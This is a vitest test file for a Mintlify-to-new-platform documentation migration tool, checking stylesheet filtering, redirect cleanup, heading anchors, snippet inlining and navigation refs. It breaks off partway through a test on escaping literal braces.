/** End-to-end repository fixtures for platform-specific navigation and assets. */

import { EventEmitter } from 'node:events'
import { mkdtempSync, mkdirSync, symlinkSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { dirname, join } from 'node:path'

import { afterEach, describe, expect, it, vi } from 'vitest'

import { cloneGitHubRepository, gitmodulePaths, migrateRepository, projectFernNavigation, readMintlifyConfig, renderMigrationFiles } from '../index.js'
import { withoutDashboardWarning } from './dashboard-warning.js'

describe('Mintlify root styles', () => {
  it('copies the implicit stylesheet and wires it into the generated config', () => {
    const root = mkdtempSync(join(tmpdir(), 'thally-migrate-style-'))
    writeFileSync(join(root, 'docs.json'), JSON.stringify({ navigation: { pages: ['introduction'] } }))
    writeFileSync(join(root, 'introduction.mdx'), '<p className="card">\n  Hello.\n</p>')
    writeFileSync(join(root, 'style.css'), '.card { padding: 1rem; }')
    const result = migrateRepository({ repositoryDir: root, sourceUrl: 'https://github.com/example/docs' })
    const href = result.docsConfig.stylesheets?.[0]
    expect(href).toMatch(/^\/migrated\/[a-f0-9]{12}\/style\.css$/)
    expect(result.assets.find((asset) => `/${asset.path}` === href)?.content.toString()).toBe('.card { padding: 1rem; }')
    expect(result.assets.some((asset) => asset.path === 'style.css')).toBe(false)
    expect(result.pages[0].body).toContain('<div className="card">')
    const equivalent = migrateRepository({ repositoryDir: root, sourceUrl: 'https://github.com/EXAMPLE/docs.git' })
    expect(equivalent.docsConfig.stylesheets).toEqual(result.docsConfig.stylesheets)
  })

  it('does not import a stylesheet with remote resources', () => {
    const root = mkdtempSync(join(tmpdir(), 'thally-migrate-style-'))
    writeFileSync(join(root, 'docs.json'), JSON.stringify({ navigation: { pages: ['introduction'] } }))
    writeFileSync(join(root, 'introduction.mdx'), 'Hello.')
    writeFileSync(join(root, 'style.css'), '@import url(https://example.com/tracker.css);')
    const result = migrateRepository({ repositoryDir: root, sourceUrl: 'https://github.com/example/docs' })
    expect(result.docsConfig.stylesheets).toBeUndefined()
    expect(result.assets.some((asset) => asset.path === 'style.css')).toBe(false)
    expect(result.warnings).toContainEqual(expect.objectContaining({ source: 'style.css' }))
  })

  it('keeps authored widget styling without leaking Mintlify shell selectors', () => {
    const root = mkdtempSync(join(tmpdir(), 'thally-migrate-style-'))
    writeFileSync(join(root, 'docs.json'), JSON.stringify({ navigation: { pages: ['introduction'] } }))
    writeFileSync(join(root, 'introduction.mdx'), '<div className="widget mintlify-layout"><p className="widget-copy">Hello.</p></div>')
    writeFileSync(join(root, 'style.css'), [
      '.widget, li.navbar-link a { padding: 1rem; }',
      '.widget-copy[data-as="p"] { margin: 0; }',
      '.mintlify-layout .widget { border: 1px solid red; }',
      '.dark .widget { color: white; }',
      '#footer a.max-w-36 { max-width: none; }',
      'a > div.w-full > div.mt-8 { position: absolute; }',
      'body:not(.widget) { display: none; }',
      'body:has(.widget) { overflow: hidden; }',
    ].join('\n'))
    const result = migrateRepository({ repositoryDir: root, sourceUrl: 'https://github.com/example/docs' })
    const href = result.docsConfig.stylesheets?.[0]
    const css = result.assets.find((asset) => `/${asset.path}` === href)?.content.toString() ?? ''
    expect(css).toContain('.widget { padding: 1rem; }')
    expect(css).toContain('.widget-copy { margin: 0; }')
    expect(css).toContain('.dark .widget { color: white; }')
    expect(css).not.toContain('mintlify-layout')
    expect(css).not.toMatch(/navbar-link|#footer|max-w-36|w-full|mt-8|data-as/)
    expect(css).not.toMatch(/body:not|body:has/)
    expect(result.assets.some((asset) => asset.path === 'style.css')).toBe(false)
    expect(result.warnings).toContainEqual(expect.objectContaining({ source: 'style.css' }))
  })

  it('does not publish a stylesheet containing only platform shell overrides', () => {
    const root = mkdtempSync(join(tmpdir(), 'thally-migrate-style-'))
    writeFileSync(join(root, 'docs.json'), JSON.stringify({ navigation: { pages: ['introduction'] } }))
    writeFileSync(join(root, 'introduction.mdx'), 'Hello.')
    writeFileSync(join(root, 'style.css'), 'li.navbar-link a { color: red; } #footer a.max-w-36 { max-width: none; }')
    const result = migrateRepository({ repositoryDir: root, sourceUrl: 'https://github.com/example/docs' })
    expect(result.docsConfig.stylesheets).toBeUndefined()
    expect(result.assets.some((asset) => asset.path.endsWith('/style.css') || asset.path === 'style.css')).toBe(false)
  })

  it('ignores classes shown only in examples and keeps authored animations', () => {
    const root = mkdtempSync(join(tmpdir(), 'thally-migrate-style-'))
    writeFileSync(join(root, 'docs.json'), JSON.stringify({ navigation: { pages: ['introduction'] } }))
    writeFileSync(join(root, 'introduction.mdx'), '<div className="widget">Live widget</div>\n\n```jsx\n<div className="platform-shell" />\n```')
    writeFileSync(join(root, 'style.css'), '@keyframes pulse { from { opacity: 0; } to { opacity: 1; } } .widget { animation: pulse 1s; } .platform-shell { display: none; }')
    const result = migrateRepository({ repositoryDir: root, sourceUrl: 'https://github.com/example/docs' })
    const href = result.docsConfig.stylesheets?.[0]
    const css = result.assets.find((asset) => `/${asset.path}` === href)?.content.toString() ?? ''
    expect(css).toContain('@keyframes pulse')
    expect(css).toContain('.widget { animation: pulse 1s; }')
    expect(css).not.toContain('platform-shell')
  })
})

// Queue of scripted `git clone` outcomes consumed in order by the mocked
// `spawn` below, so `cloneGitHubRepository`'s retry-on-network-failure logic
// (repository.ts) can be tested without a real clone.
// `hang` never exits on its own (only when killed); `ticks` are the times (ms)
// at which progress is printed before a normal exit one second after the last.
// `exitAt` makes git itself exit (emitting only `exit`) at that time while a
// helper keeps stderr open: `helperTicks` are later helper writes, and
// `closeAt`, if set, is when the pipe finally closes.
const cloneOutcomes = vi.hoisted(() => ({ queue: [] as Array<{ code: number; stderr?: string; hang?: boolean; exitOnly?: boolean; ticks?: Array<number>; exitAt?: number; helperTicks?: Array<number>; closeAt?: number }> }))
const gitKills = vi.hoisted(() => ({ count: 0 }))
// Remote spec URLs must never invoke a subprocess or make a network request.
const execFileCalls = vi.hoisted(() => ({ calls: [] as Array<string> }))
// Records each `spawn('git', args, options)` call's env, so a test can
// assert the LFS-filter-neutralizing env actually reaches the git process
// without a real clone (that's covered manually against BoundaryML/baml, a
// real Git LFS repo, since a mocked child process can't exercise git's own
// filter-driver resolution).
const gitSpawnCalls = vi.hoisted(() => ({ envs: [] as Array<Record<string, string | undefined>>, args: [] as Array<Array<string>> }))
vi.mock('node:child_process', () => {
  return {
    spawn: (_command: string, args: Array<string>, options: { env?: Record<string, string | undefined> }) => {
      gitSpawnCalls.envs.push(options.env ?? {})
      gitSpawnCalls.args.push(args)
      const child = new EventEmitter() as EventEmitter & { stderr: EventEmitter & { setEncoding: (encoding: string) => void; destroy: () => void }; kill: () => void }
      child.stderr = Object.assign(new EventEmitter(), { setEncoding: () => {}, destroy: () => {} })
      child.kill = () => {
        gitKills.count += 1
        queueMicrotask(() => child.emit(outcome.exitOnly ? 'exit' : 'close', null))
      }
      const outcome = cloneOutcomes.queue.shift() ?? { code: 0 }
      if (outcome.hang) return child
      if (outcome.exitAt !== undefined) {
        const { exitAt } = outcome
        if (outcome.stderr) setTimeout(() => child.stderr.emit('data', outcome.stderr), Math.max(0, exitAt - 1))
        setTimeout(() => child.emit('exit', outcome.code), exitAt)
        for (const tick of outcome.helperTicks ?? []) setTimeout(() => child.stderr.emit('data', 'helper still attached\n'), tick)
        if (outcome.closeAt !== undefined) setTimeout(() => child.emit('close', outcome.code), outcome.closeAt)
        return child
      }
      if (outcome.ticks) {
        for (const tick of outcome.ticks) setTimeout(() => child.stderr.emit('data', 'Receiving objects:  50%\r'), tick)
        setTimeout(() => child.emit('close', outcome.code), Math.max(...outcome.ticks) + 1000)
        return child
      }
      queueMicrotask(() => {
        if (outcome.stderr) child.stderr.emit('data', outcome.stderr)
        child.emit('close', outcome.code)
      })
      return child
    },
    execFileSync: (command: string) => {
      execFileCalls.calls.push(command)
      throw new Error('Migration must not execute remote spec download commands')
    },
  }
})

describe('repository redirect finalization', () => {
  it('omits self redirects across trailing slashes and with only a query added, and keeps distinct destinations', () => {
    const root = mkdtempSync(join(tmpdir(), 'thally-migrate-self-redirects-'))
    writeFileSync(join(root, 'introduction.mdx'), '# Introduction\n\n[Models](/docs/models)')
    writeFileSync(join(root, 'models.mdx'), '# Models')
    writeFileSync(join(root, 'docs.json'), JSON.stringify({
      $schema: 'https://mintlify.com/docs.json',
      navigation: { pages: ['introduction', 'models'] },
      redirects: [
        { source: '/docs/models', destination: '/docs/models' },
        { source: '/docs/models/', destination: '/docs/models' },
        { source: '/docs/models', destination: '/docs/models?view=all' },
        { source: '/docs/old-models', destination: '/docs/models' },
      ],
    }))

    const bundle = migrateRepository({ repositoryDir: root, sourceUrl: 'https://github.com/acme/docs' })
    expect(bundle.docsConfig.redirects).toContainEqual({ source: '/docs/old-models', destination: '/docs/models' })
    expect(bundle.docsConfig.redirects).not.toContainEqual({ source: '/docs/models', destination: '/docs/models' })
    expect(bundle.docsConfig.redirects).not.toContainEqual({ source: '/docs/models/', destination: '/docs/models' })
    expect(bundle.docsConfig.redirects).not.toContainEqual({ source: '/docs/models', destination: '/docs/models?view=all' })
    expect(bundle.warnings.filter((warning) => warning.message.startsWith('Self-redirect'))).toHaveLength(2)
    expect(bundle.warnings.map((warning) => warning.message)).toContain('Skipped 1 redirect that would send visitors in a circle: /docs/models -> /docs/models?view=all. Check these redirects in the source docs.')
  })
})

describe('linked source anchors', () => {
  it('preserves uniquely matching Mintlify fragments across pages', () => {
    const root = mkdtempSync(join(tmpdir(), 'thally-migrate-mintlify-anchors-'))
    writeFileSync(join(root, 'docs.json'), JSON.stringify({
      $schema: 'https://mintlify.com/docs.json',
      navigation: { pages: ['intro', 'settings'] },
    }))
    writeFileSync(join(root, 'intro.mdx'), '---\ntitle: Intro\n---\n\n[Settings](/settings#api-params)')
    writeFileSync(join(root, 'settings.mdx'), '---\ntitle: Settings\n---\n\n## APIParams\n\nDetails.')
    const bundle = migrateRepository({ repositoryDir: root, sourceUrl: 'https://github.com/acme/docs' })
    expect(bundle.pages.find((page) => page.id === 'settings')?.body).toContain('<a id="api-params"></a>\n## APIParams')
  })

  it('keeps a Mintlify page\'s explicit heading id on the heading when it also imports a component', () => {
    const root = mkdtempSync(join(tmpdir(), 'thally-migrate-mintlify-heading-id-'))
    mkdirSync(join(root, 'snippets'))
    writeFileSync(join(root, 'docs.json'), JSON.stringify({
      $schema: 'https://mintlify.com/docs.json',
      navigation: { pages: ['es/intro'] },
    }))
    writeFileSync(join(root, 'snippets/widget.jsx'), 'export const Widget = () => <div>Hi</div>\n')
    mkdirSync(join(root, 'es'))
    writeFileSync(join(root, 'es/intro.mdx'), [
      '---', 'title: Intro', '---', '',
      'import { Widget } from "/snippets/widget.jsx";', '',
      '<Widget />', '',
      '## Primeros pasos {#get-started}', '',
      '[Ir](#get-started)',
    ].join('\n'))
    const body = migrateRepository({ repositoryDir: root, sourceUrl: 'https://github.com/acme/docs' }).pages.find((page) => page.id === 'es/intro')?.body
    expect(body).toContain('## Primeros pasos {/* #get-started */}')
    expect(body).not.toContain('<a id="get-started">')
  })

  it('maps case-different fragments onto numbered ids of repeated headings', () => {
    const root = mkdtempSync(join(tmpdir(), 'thally-migrate-repeated-headings-'))
    writeFileSync(join(root, 'docs.json'), JSON.stringify({
      $schema: 'https://mintlify.com/docs.json',
      navigation: { pages: ['intro', 'cli'] },
    }))
    writeFileSync(join(root, 'intro.mdx'), '---\ntitle: Intro\n---\n\n[a](/cli#Options) [b](/cli#Options-1)')
    writeFileSync(join(root, 'cli.mdx'), '---\ntitle: CLI\n---\n\n## Run\n\n#### Options\n\nx\n\n## Open\n\n#### Options\n\ny')
    const body = migrateRepository({ repositoryDir: root, sourceUrl: 'https://github.com/acme/docs' }).pages.find((page) => page.id === 'cli')?.body
    expect(body).toContain('<a id="Options"></a>\n#### Options\n\nx')
    expect(body).toContain('<a id="Options-1"></a>\n#### Options\n\ny')
  })

  it('points a fragment at its one heading when option tables repeat the same name', () => {
    const root = mkdtempSync(join(tmpdir(), 'thally-migrate-heading-and-tables-'))
    writeFileSync(join(root, 'docs.json'), JSON.stringify({
      $schema: 'https://mintlify.com/docs.json',
      navigation: { pages: ['intro', 'settings'] },
    }))
    writeFileSync(join(root, 'intro.mdx'), '---\ntitle: Intro\n---\n\n[Node events](/settings#setupNodeEvents)')
    writeFileSync(join(root, 'settings.mdx'), [
      '---', 'title: Settings', '---', '',
      '| Option | Default |', '| --- | --- |',
      '| `setupNodeEvents` | `null` |', '',
      '| Option | Default |', '| --- | --- |',
      '| `setupNodeEvents` | `null` |', '',
      '### setupNodeEvents', '', 'Details.',
    ].join('\n'))
    const bundle = migrateRepository({ repositoryDir: root, sourceUrl: 'https://github.com/acme/docs' })
    expect(bundle.pages.find((page) => page.id === 'settings')?.body).toContain('<a id="setupNodeEvents"></a>\n### setupNodeEvents')
  })
})

afterEach(() => { execFileCalls.calls.length = 0 })

function fixture(): string {
  const root = mkdtempSync(join(tmpdir(), 'thally-migrate-repository-'))
  mkdirSync(join(root, 'en', 'guides'), { recursive: true })
  mkdirSync(join(root, 'es', 'guides'), { recursive: true })
  mkdirSync(join(root, 'images'), { recursive: true })
  mkdirSync(join(root, 'snippets'), { recursive: true })
  writeFileSync(join(root, 'navigation.json'), JSON.stringify({
    languages: [
      {
        language: 'en',
        tabs: [{ tab: 'Guides', groups: [{ group: 'Start', pages: ['en/introduction', 'en/guides/install'] }] }],
      },
      {
        language: 'es',
        tabs: [{ tab: 'Guides', groups: [{ group: 'Start', pages: ['es/introduction', 'es/guides/install'] }] }],
      },
    ],
  }))
  writeFileSync(join(root, 'docs.json'), JSON.stringify({
    $schema: 'https://mintlify.com/docs.json',
    navigation: { $ref: './navigation.json' },
  }))
  writeFileSync(join(root, 'README.md'), '# Repository readme\n\nThis must not become a docs page.')
  mkdirSync(join(root, '.claude', 'skills', 'doc-author'), { recursive: true })
  writeFileSync(join(root, '.claude', 'skills', 'doc-author', 'SKILL.mdx'), '# Not a docs page\n\n</Broken>')
  writeFileSync(join(root, 'en', 'introduction.mdx'), '---\ntitle: Welcome\n---\n\n# Welcome\n\nEnglish docs.')
  writeFileSync(join(root, 'en', 'guides', 'install.mdx'), '---\ntitle: Install\n---\n\nimport Prerequisite from \'/snippets/prerequisite.mdx\'\n\n<Prerequisite />\n\n<Danger>Back up first.</Danger>\n\n<Warn>Review the result.</Warn>')
  writeFileSync(join(root, 'es', 'introduction.mdx'), '---\ntitle: Bienvenido\n---\n\nDocumentación española.')
  writeFileSync(join(root, 'es', 'guides', 'install.mdx'), '---\ntitle: Instalar\n---\n\nPasos de instalación.')
  writeFileSync(join(root, 'images', 'logo.svg'), '<svg xmlns="http://www.w3.org/2000/svg"/>')
  writeFileSync(join(root, 'snippets', 'prerequisite.mdx'), 'Install Node.js before continuing.')
  return root
}

describe('Mintlify repository migration', () => {
  it('resolves JSON pointers into arrays without allowing refs through symlinks', () => {
    const root = mkdtempSync(join(tmpdir(), 'thally-migrate-mintlify-refs-'))
    writeFileSync(join(root, 'navigation.json'), JSON.stringify({
      fragments: [{ groups: [{ group: 'Start', pages: ['introduction'] }] }],
    }))
    writeFileSync(join(root, 'docs.json'), JSON.stringify({
      $schema: 'https://mintlify.com/docs.json',
      navigation: { $ref: './navigation.json#/fragments/0' },
    }))
    expect(readMintlifyConfig(root)).toMatchObject({
      navigation: { groups: [{ group: 'Start', pages: ['introduction'] }] },
    })

    const outside = mkdtempSync(join(tmpdir(), 'thally-migrate-mintlify-outside-'))
    writeFileSync(join(outside, 'navigation.json'), JSON.stringify({ pages: ['private'] }))
    symlinkSync(join(outside, 'navigation.json'), join(root, 'outside.json'))
    writeFileSync(join(root, 'docs.json'), JSON.stringify({
      $schema: 'https://mintlify.com/docs.json',
      navigation: { $ref: './outside.json' },
    }))
    expect(() => readMintlifyConfig(root)).toThrow('not a regular file')
  })

  it('resolves navigation refs, preserves locales, excludes repo metadata, and renders assets', () => {
    const bundle = migrateRepository({
      repositoryDir: fixture(),
      sourceUrl: 'https://github.com/acme/docs',
    })

    expect(bundle.platform).toBe('mintlify')
    expect(bundle.pages.map((page) => page.id)).toEqual([
      'introduction',
      'guides/install',
      'es/introduction',
      'es/guides/install',
    ])
    expect(bundle.pages[1].body).toContain('<Error>Back up first.</Error>')
    expect(bundle.pages[1].body).toContain('<Warning>Review the result.</Warning>')
    expect(bundle.pages[1].body).toContain('Install Node.js before continuing.')
    expect(bundle.pages.map((page) => page.id)).not.toContain('snippets/prerequisite')
    expect(bundle.pages.map((page) => page.id)).not.toContain('.claude/skills/doc-author/SKILL')
    expect(bundle.docsConfig.i18n).toMatchObject({
      defaultLocale: 'en',
      locales: [
        { code: 'en', label: 'English' },
        { code: 'es', label: 'Español' },
      ],
    })
    expect(bundle.docsConfig.tabs[0]).toMatchObject({
      tab: 'Guides',
      groups: [{ group: 'Start', pages: ['introduction', 'guides/install'] }],
    })
    const files = renderMigrationFiles(bundle)
    expect(files.map((file) => file.path)).toContain('public/images/logo.svg')
    expect(files.map((file) => file.path)).not.toContain('src/content/readme.mdx')
  })

  it('inlines <Snippet file="..."> references with no import statement', () => {
    const root = fixture()
    writeFileSync(
      join(root, 'en', 'guides', 'install.mdx'),
      '---\ntitle: Install\n---\n\n<Snippet file="/snippets/prerequisite.mdx" />',
    )
    const bundle = migrateRepository({ repositoryDir: root, sourceUrl: 'https://github.com/acme/docs' })
    const page = bundle.pages.find((candidate) => candidate.id === 'guides/install')
    expect(page?.body).toContain('Install Node.js before continuing.')
    expect(page?.body).not.toContain('<Snippet')
  })

  it('inlines an upper-case value export imported by a single-name import (`import { API_KEY_REF } from ...`) instead of dropping the binding', () => {
    const root = mkdtempSync(join(tmpdir(), 'thally-migrate-snippet-const-'))
    mkdirSync(join(root, 'snippets'), { recursive: true })
    writeFileSync(join(root, 'docs.json'), JSON.stringify({
      $schema: 'https://mintlify.com/docs.json',
      navigation: { pages: ['home'] },
    }))
    writeFileSync(join(root, 'snippets', 'constants.mdx'), "export const API_KEY_REF = '<KEY>';\n")
    writeFileSync(join(root, 'home.mdx'), "---\ntitle: Home\n---\n\nimport { API_KEY_REF } from '/snippets/constants.mdx';\n\nKey: {API_KEY_REF}\n")

    const bundle = migrateRepository({ repositoryDir: root, sourceUrl: 'https://github.com/acme/docs' })
    const page = bundle.pages.find((candidate) => candidate.id === 'home')
    expect(page?.body).toContain('export const API_KEY_REF = "<KEY>";')
    expect(page?.body).not.toContain("constants.mdx")
  })

  it('inlines a static object-literal export imported alongside primitive values (`PDFParserEngine.MistralOCR`) instead of leaving the whole import dangling', () => {
    const root = mkdtempSync(join(tmpdir(), 'thally-migrate-snippet-object-'))
    mkdirSync(join(root, 'snippets'), { recursive: true })
    writeFileSync(join(root, 'docs.json'), JSON.stringify({
      $schema: 'https://mintlify.com/docs.json',
      navigation: { pages: ['home'] },
    }))
    writeFileSync(join(root, 'snippets', 'constants.mdx'), "export const Engine = {\n  Mistral: 'mistral-ocr',\n  Native: 'native',\n};\nexport const COST = 2;\n")
    writeFileSync(join(root, 'home.mdx'), "---\ntitle: Home\n---\n\nimport {\n  COST as PRICE,\n  Engine,\n} from '/snippets/constants.mdx';\n\nEngine: {Engine.Mistral} {PRICE}\n")

    const bundle = migrateRepository({ repositoryDir: root, sourceUrl: 'https://github.com/acme/docs' })
    const page = bundle.pages.find((candidate) => candidate.id === 'home')
    expect(page?.body).toContain('export const PRICE = 2;')
    expect(page?.body).toMatch(/export const Engine = \{[^}]*Mistral: 'mistral-ocr'/)
    expect(page?.body).not.toContain('constants.mdx')
  })

  it('inlines a self-contained function export imported from a snippet (`getTotalFeeString(...)` used in prose)', () => {
    const root = mkdtempSync(join(tmpdir(), 'thally-migrate-snippet-fn-'))
    mkdirSync(join(root, 'snippets'), { recursive: true })
    writeFileSync(join(root, 'docs.json'), JSON.stringify({
      $schema: 'https://mintlify.com/docs.json',
      navigation: { pages: ['home'] },
    }))
    writeFileSync(join(root, 'snippets', 'constants.mdx'), "export const fee = (type, value) => {\n  if (type === 'a') return '5%';\n  return String(value);\n};\n")
    writeFileSync(join(root, 'home.mdx'), "---\ntitle: Home\n---\n\nimport {\n  fee\n} from '/snippets/constants.mdx';\n\nFee {fee('a', null)}\n")

    const bundle = migrateRepository({ repositoryDir: root, sourceUrl: 'https://github.com/acme/docs' })
    const page = bundle.pages.find((candidate) => candidate.id === 'home')
    expect(page?.body).toContain("export const fee = (type, value) => {")
    expect(page?.body).not.toContain('constants.mdx')
    expect(bundle.warnings.some((warning) => warning.message.includes('"fee"'))).toBe(false)
  })

  it('binds an export that cannot be inlined to undefined with a warning and still inlines the others from the same import', () => {
    const root = mkdtempSync(join(tmpdir(), 'thally-migrate-snippet-unresolved-'))
    mkdirSync(join(root, 'snippets'), { recursive: true })
    writeFileSync(join(root, 'docs.json'), JSON.stringify({
      $schema: 'https://mintlify.com/docs.json',
      navigation: { pages: ['home'] },
    }))
    writeFileSync(join(root, 'snippets', 'constants.mdx'), "export const compute = () => outside + 1;\nexport const FEE = '5';\nexport const Dyn = makeThing();\n")
    writeFileSync(join(root, 'home.mdx'), "---\ntitle: Home\n---\n\nimport { compute, FEE, Dyn } from '/snippets/constants.mdx';\n\n{compute()} {FEE}\n")

    const bundle = migrateRepository({ repositoryDir: root, sourceUrl: 'https://github.com/acme/docs' })
    const page = bundle.pages.find((candidate) => candidate.id === 'home')
    expect(bundle.warnings).toContainEqual(expect.objectContaining({ code: 'unsupported-config', message: expect.stringContaining('Define "compute" in the page') }))
    expect(page?.body).toContain('export const compute = undefined;')
    expect(page?.body).toContain('export const FEE = "5";')
    expect(page?.body).not.toContain('constants.mdx')
  })

  it('binds a name the snippet does not export to undefined and still inlines the others from the same import', () => {
    const root = mkdtempSync(join(tmpdir(), 'thally-migrate-snippet-missing-export-'))
    mkdirSync(join(root, 'snippets'), { recursive: true })
    writeFileSync(join(root, 'docs.json'), JSON.stringify({
      $schema: 'https://mintlify.com/docs.json',
      navigation: { pages: ['home'] },
    }))
    writeFileSync(join(root, 'snippets', 'constants.mdx'), "export const FEE = '5';\n")
    writeFileSync(join(root, 'home.mdx'), "---\ntitle: Home\n---\n\nimport {\n  FEE,\n  MISSING_LIMIT,\n} from '/snippets/constants.mdx';\n\nFee {FEE}% limit {MISSING_LIMIT}.\n")

    const bundle = migrateRepository({ repositoryDir: root, sourceUrl: 'https://github.com/acme/docs' })
    const page = bundle.pages.find((candidate) => candidate.id === 'home')
    expect(page?.body).toContain('export const FEE = "5";')
    expect(page?.body).toContain('export const MISSING_LIMIT = undefined;')
    expect(page?.body).not.toContain('constants.mdx')
    expect(bundle.warnings.some((warning) => warning.message.includes('"MISSING_LIMIT" is not exported') && warning.source === 'home.mdx' && warning.code === 'unsupported-config')).toBe(true)
  })

  it('hoists a component snippet as a real declaration instead of splicing its source into the usage tag', () => {
    const root = mkdtempSync(join(tmpdir(), 'thally-migrate-mintlify-component-snippet-'))
    mkdirSync(join(root, 'snippets'), { recursive: true })
    writeFileSync(join(root, 'docs.json'), JSON.stringify({
      $schema: 'https://mintlify.com/docs.json',
      navigation: { pages: ['home'] },
    }))
    writeFileSync(join(root, 'snippets', 'counter.mdx'), "export const Counter = () => {\n  const [n, setN] = useState(0)\n  return <button onClick={() => setN(n + 1)}>{n}</button>\n}")
    writeFileSync(join(root, 'home.mdx'), "---\ntitle: Home\n---\n\nimport { Counter } from '/snippets/counter.mdx'\n\n<Counter />")

    const bundle = migrateRepository({ repositoryDir: root, sourceUrl: 'https://github.com/acme/docs' })
    const page = bundle.pages.find((candidate) => candidate.id === 'home')
    // The usage stays a live self-closing tag (here rewritten to the
    // registered client component by the component migrator); it must not
    // be replaced by the declaration's own source text.
    expect(page?.body).not.toMatch(/<Counter\s*>[\s\S]*<\/Counter>/)
    expect(page?.body).not.toContain('return <button')
    expect(page?.body.match(/\/>/g)).toHaveLength(1)
  })

  it('keeps a snippet component together with the sibling it renders when only the hook component is imported', () => {
    const root = mkdtempSync(join(tmpdir(), 'thally-migrate-snippet-sibling-'))
    mkdirSync(join(root, 'snippets'), { recursive: true })
    writeFileSync(join(root, 'docs.json'), JSON.stringify({
      $schema: 'https://mintlify.com/docs.json',
      navigation: { pages: ['home'] },
    }))
    writeFileSync(join(root, 'snippets', 'counter.mdx'), "export const Label = ({ t }) => <em>{t}</em>\nexport const Counter = () => {\n  const [n, setN] = useState(0)\n  return <button onClick={() => setN(n + 1)}><Label t={n} /></button>\n}\n")
    writeFileSync(join(root, 'home.mdx'), "---\ntitle: Home\n---\n\nimport { Counter } from '/snippets/counter.mdx'\n\n<Counter />\n")

    const bundle = migrateRepository({ repositoryDir: root, sourceUrl: 'https://github.com/acme/docs' })
    const page = bundle.pages.find((candidate) => candidate.id === 'home')
    expect(withoutDashboardWarning(bundle.warnings)).toEqual([])
    expect(page?.body).toMatch(/^<Migrated[a-f0-9]+ \/>$/m)
    expect(page?.body).not.toContain('onClick')
    const client = bundle.componentFiles?.find((file) => file.path.includes('/inline-'))
    expect(String(client?.content)).toContain('export const Label')
    expect(String(client?.content)).toContain('export const Counter')
  })

  describe('a snippet component used without an import', () => {
    const project = (snippets: Record<string, string>, page = "---\ntitle: Home\n---\n\n<Template data={{ A: 'b' }}>Hello</Template>\n") => {
      const root = mkdtempSync(join(tmpdir(), 'thally-migrate-unimported-'))
      writeFileSync(join(root, 'docs.json'), JSON.stringify({ $schema: 'https://mintlify.com/docs.json', navigation: { pages: ['home'] } }))
      for (const [path, content] of Object.entries(snippets)) {
        mkdirSync(dirname(join(root, path)), { recursive: true })
        writeFileSync(join(root, path), content)
      }
      writeFileSync(join(root, 'home.mdx'), page)
      const bundle = migrateRepository({ repositoryDir: root, sourceUrl: 'https://github.com/acme/docs' })
      return { bundle, body: bundle.pages.find((candidate) => candidate.id === 'home')!.body, messages: bundle.warnings.map((warning) => warning.message) }
    }
    const template = 'export const Template = ({ children, data }) => <>{children}</>\n'

    it('resolves the one snippet exporting that name, keeps its props and says the live site rendered it empty', () => {
      const { body, messages, bundle } = project({ 'snippets/exports/Template.jsx': template })
      expect(messages).toContain('<Template> is used without an import; it was resolved to snippets/exports/Template.jsx (the only snippet exporting that name). Mintlify renders unimported components as empty, so this page now shows content the live site does not.')
      expect(messages.some((message) => message.includes('Unresolved MDX component <Template>'))).toBe(false)
      expect(body).toContain('data=')
      expect(body).not.toContain('<div>')
      expect(bundle.componentFiles?.some((file) => file.path.endsWith('/Template.jsx'))).toBe(true)
    })

    it('imports a default-exported component as a default import, never as a named one that would be undefined', () => {
      const { bundle } = project({ 'snippets/Foo.jsx': 'export default function Foo() { return <b>x</b> }\n' }, '---\ntitle: Home\n---\n\n<Foo />\n')
      const registry = String(bundle.componentFiles?.find((file) => file.path === 'src/mdx/custom-components.tsx')?.content)
      expect(registry).toMatch(/import \{ default as Migrated[0-9a-f]+ \} from/)
      expect(registry).not.toMatch(/import \{ Foo as/)
    })

    it('keeps the plain fallback when two snippets export the same name', () => {
      const { body, messages } = project({ 'snippets/a/Template.jsx': template, 'snippets/b/Template.jsx': template })
      expect(messages.some((message) => message.includes('Unresolved MDX component <Template>'))).toBe(true)
      expect(messages.some((message) => message.includes('used without an import'))).toBe(false)
      expect(body).toContain('<div>')
    })

    it('keeps the plain fallback when no snippet exports the name', () => {
      const { messages } = project({ 'snippets/exports/Other.jsx': 'export const Other = () => null\n' })
      expect(messages.some((message) => message.includes('Unresolved MDX component <Template>'))).toBe(true)
      expect(messages.some((message) => message.includes('used without an import'))).toBe(false)
    })

    it('keeps the plain fallback when the only matching snippet is access-restricted', () => {
      const { body, messages } = project({ 'snippets/exports/Template.jsx': `---\ngroups: [admin]\n---\n${template}` })
      expect(messages.some((message) => message.includes('used without an import'))).toBe(false)
      expect(messages.some((message) => message.includes('Unresolved MDX component <Template>'))).toBe(true)
      expect(body).not.toContain('data=')
    })
  })

  it('does not let a page-local component be shadowed by a same-named global snippet alias', () => {
    const root = mkdtempSync(join(tmpdir(), 'thally-migrate-mintlify-alias-'))
    mkdirSync(join(root, 'snippets'), { recursive: true })
    writeFileSync(join(root, 'docs.json'), JSON.stringify({
      $schema: 'https://mintlify.com/docs.json',
      navigation: { pages: ['imports-snippet', 'declares-locally'] },
    }))
    writeFileSync(join(root, 'snippets', 'counter.mdx'), 'export const Counter = () => {\n  return <div>from snippet</div>\n}')
    writeFileSync(join(root, 'imports-snippet.mdx'), "---\ntitle: Imports\n---\n\nimport { Counter } from '/snippets/counter.mdx'\n\n<Counter />")
    writeFileSync(join(root, 'declares-locally.mdx'), '---\ntitle: Local\n---\n\nexport const Counter = () => {\n  return <div>local component</div>\n}\n\n<Counter />')

    const bundle = migrateRepository({ repositoryDir: root, sourceUrl: 'https://github.com/acme/docs' })
    const local = bundle.pages.find((candidate) => candidate.id === 'declares-locally')
    expect(local?.body).toContain('local component')
    expect(local?.body).not.toContain('from snippet')
    expect(local?.body.match(/export const Counter/g)).toHaveLength(1)

    // The named-import form (`import { Name } from '...'`) is what Mintlify's
    // own docs use for snippets; it must be fully consumed, not left behind
    // as a dead import alongside the inlined content.
    const imported = bundle.pages.find((candidate) => candidate.id === 'imports-snippet')
    expect(imported?.body).toContain('from snippet')
    expect(imported?.body).not.toContain('import')
  })

  it('escapes a bare literal brace in Mintlify page prose instead of crashing the build (frontmatter untouched)', () => {
    const root = mkdtempSync(join(tmpdir(), 'thally-migrate-mintlify-braces-'))
    writeFileSync(join(root, 'docs.json'), JSON.stringify({
      $schema: 'https://mintlify.com/docs.json',
      navigation: { pages: ['style-guide'] },
    }))
    writeFileSync(join(root, 'style-guide.mdx'), '---\ntitle: Style guide\ndescription: "Use {x} as a placeholder"\n---\n\nWrap a variable like {x} in braces.')

    const bundle = migrateRepository({ repositoryDir: root, sourceUrl: 'https://github.com/acme/docs' })

